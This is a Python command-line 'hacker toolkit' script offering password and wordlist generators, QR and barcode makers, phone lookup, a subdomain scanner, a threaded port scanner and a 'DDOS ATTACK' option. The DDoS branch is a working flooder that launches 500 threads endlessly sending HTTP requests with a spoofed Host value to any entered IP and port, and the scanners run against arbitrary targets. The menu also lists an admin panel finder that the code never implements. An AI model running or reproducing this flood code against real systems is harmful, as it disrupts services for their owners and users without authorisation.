import os
import time
from tqdm import tqdm
from pyfiglet import Figlet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN13
from queue import Queue
import socket
import threading
from barcode.writer import ImageWriter
import phonenumbers
from phonenumbers import carrier
from phonenumbers import geocoder
from tabulate import tabulate

result = Figlet(font="slant").renderText("STRANGE")
print(result)

options = ("1- MY IP ADDRESS\n2- PASSWORD GENERATOR\n3- WORDLIST GENERATOR\n4- BARCODE GENERATOR\n5- QRCODE GENERATOR\n6- PHONE NUMBER INFO\n7- SUBDOMAIN SCANNER\n8- PORT SCANNER\n9- DDOS ATTACK\n10- ADMIN PANEL FINDER\n")
print(options)
select = int(input("ENTER YOUR CHOICE >>>>-----> "))

def loading():
    for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
        time.sleep(0.01)

def font(text):
    cool_text = Figlet(font="slant")
    return cool_text.renderText(text)

def window_size(columns=80, height=20):
    os.system("cls" if os.name == "nt" else "clear")
    os.system(f'mode con: cols={columns} lines={height}')

if select == 1:
    window_size()
    print(font("FIND MY IP"))
    loading()
    
    hostname = socket.gethostname()
    IPaddr = socket.gethostbyname(hostname)
    print("YOUR DEVICE IP IS: " + IPaddr)
    input("PRESS ENTER TO EXIT:")
    
elif select == 2:
    window_size()
    print(font("PASSWORD GENERATOR"))
    loading()
    
    length = int(input("ENTER THE LENGTH OF THE PASSWORD >>>>-------> "))
    
    def get_random_string(length):
        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*(){}[]\\|:;><,.?/+=_-"
        password = "".join(random.sample(characters, length))
        print("GENERATED PASSWORD IS: " + password)
    
    get_random_string(length)
    input("PRESS ENTER TO EXIT")

elif select == 3:
    window_size()
    print(font("WORDLIST GENERATOR"))
    loading()
    
    print("GENERATED PASSWORD IS SAVED IN THE PRESENT FOLDER")
    chrs = input("ENTER THE LETTERS FOR COMBINATION >>>>-----> ")
    min_length = int(input("MINIMUM LENGTH OF PASSWORD >>>>-----> "))
    max_length = int(input("MAXIMUM LENGTH OF PASSWORD >>>>-----> "))
    
    file_name = input("[+] ENTER THE NAME OF THE FILE >>>>-----> ")
    
    with open(file_name, 'w') as psd:
        for i in range(min_length, max_length + 1):
            for xs in itertools.product(chrs, repeat=i):
                psd.write(''.join(xs) + '\n')
    
    print("DONE SUCCESS")
    input("PRESS ENTER TO EXIT")

elif select == 4:
    window_size()
    print(font("BARCODE GENERATOR"))
    loading()
    
    print("GENERATED BARCODE WILL BE SAVED AS PNG")
    
    def generate_barcode(number):
        my_code = EAN13(number, writer=ImageWriter())
        my_code.save("bar_code")
    
    number = input("ENTER 12 DIGIT NUMBER TO GENERATE BARCODE >>>>-----> ")
    generate_barcode(number)
    input("PRESS ENTER TO EXIT")

elif select == 5:
    window_size()
    print(font("QR GENERATOR"))
    loading()
    
    print("Generated QR code will be saved as myqr.png")
    s = input("ENTER THE LINK TO CREATE A QRCODE >>>>_____> ")
    url = pyqrcode.create(s)
    url.svg("myqr.svg", scale=8)
    url.png('myqr.png', scale=6)
    input("PRESS ENTER TO EXIT")

elif select == 6:
    window_size()
    print(font("PHONE NUMBER INFO"))
    loading()
    
    def num_scanner(phn_num):
        number = phonenumbers.parse(phn_num)
        description = geocoder.description_for_number(number, 'en')
        supplier = carrier.name_for_number(number, 'en')
        info = [["Country", "Supplier"], [description, supplier]]
        return tabulate(info, headers="firstrow", tablefmt="github")
    
    number = input("ENTER THE NUMBER >>>>----> ")
    print(num_scanner(number))
    input("PRESS ENTER TO EXIT")

elif select == 7:
    window_size()
    print(font("SUBDOMAIN SCANNER"))
    loading()
    
    domain = input("ENTER THE DOMAIN TO SCAN >>>>-----> ")
    with open("subdomains.txt") as file:
        subdomains = file.read().splitlines()
    
    for subdomain in subdomains:
        url = f"http://{subdomain}.{domain}"
        try:
            requests.get(url)
        except requests.ConnectionError:
            pass
        else:
            print("[+] Discovered subdomain:", url)
    input("PRESS ENTER TO EXIT")

elif select == 8:
    window_size()
    print(font("PORT SCANNER"))
    loading()
    
    target = input("ENTER THE IP ADDRESS TO SCAN >>>>-----> ")
    queue = Queue()
    open_ports = []

    def portscan(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            return True
        except:
            return False

    def get_ports(mode):
        if mode == 1:
            for port in range(1, 1024):
                queue.put(port)
        elif mode == 2:
            for port in range(1, 49152):
                queue.put(port)
        elif mode == 3:
            ports = [20, 21, 22, 23, 25, 53, 80, 110, 443]
            for port in ports:
                queue.put(port)
        elif mode == 4:
            ports = input("ENTER THE PORTS (comma separated) >>>>-----> ").split(',')
            ports = list(map(int, ports))
            for port in ports:
                queue.put(port)

    def worker():
        while not queue.empty():
            port = queue.get()
            if portscan(port):
                print(f"Port {port} is open")
                open_ports.append(port)

    def run_scanner(threads, mode):
        get_ports(mode)
        thread_list = []
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread_list.append(thread)
        for thread in thread_list:
            thread.start()
        for thread in thread_list:
            thread.join()
        print("Open ports are:", open_ports)

    threads = 100
    mode = 1
    run_scanner(threads, mode)
    input("PRESS ENTER TO EXIT")

elif select == 9:
    window_size()
    print(font("DDOS ATTACK"))
    loading()
    
    target = input("ENTER THE IP ADDRESS >>>>-----> ")
    port = int(input("ENTER THE PORT >>>>-----> "))
    fake_ip = "181.4.20.196"
    already_connected = 0
    
    def attack():
        global already_connected
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                s.close()
                already_connected += 1
                if already_connected % 500 == 0:
                    print(already_connected)
            except:
                pass
    
    for _ in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
    input("PRESS ENTER TO EXIT")
else:
    print("Invalid choice")